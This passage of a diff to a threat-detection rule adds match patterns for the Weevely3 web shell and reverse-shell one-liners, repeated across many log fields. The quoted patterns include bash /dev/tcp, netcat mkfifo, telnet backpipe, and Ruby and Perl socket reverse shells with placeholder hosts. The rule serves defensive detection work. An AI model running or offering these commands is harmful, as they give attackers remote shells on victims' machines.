+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - TransportName:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - NewProcessName:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - ParentProcessName:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - Application:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - Product Name:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - Threat Name:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - Process Name:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - Path:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - ImagePath:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - ServiceName:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - ProcessPath:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - AppName:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - AppPath:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - ModulePath:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - registry.data.strings:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - registry.path:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - registry.value:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - process.args:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - process.command_line:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - process.env_vars:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - process.io.text:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - process.executable:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - process.name:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - process.title:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - pe.company:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - pe.description:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - pe.original_file_name:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - pe.product:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - os.full:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - host.hostname:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - file.fork_name:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - file.name:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - file.path:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - file.target_path:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - email.attachments.file.name:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - email.subject:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - dll.path:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - device.model.name:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - container.image.name:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - container.name:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - object:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
+  - ParentCommandLine:
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
+  - CommandLine:
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
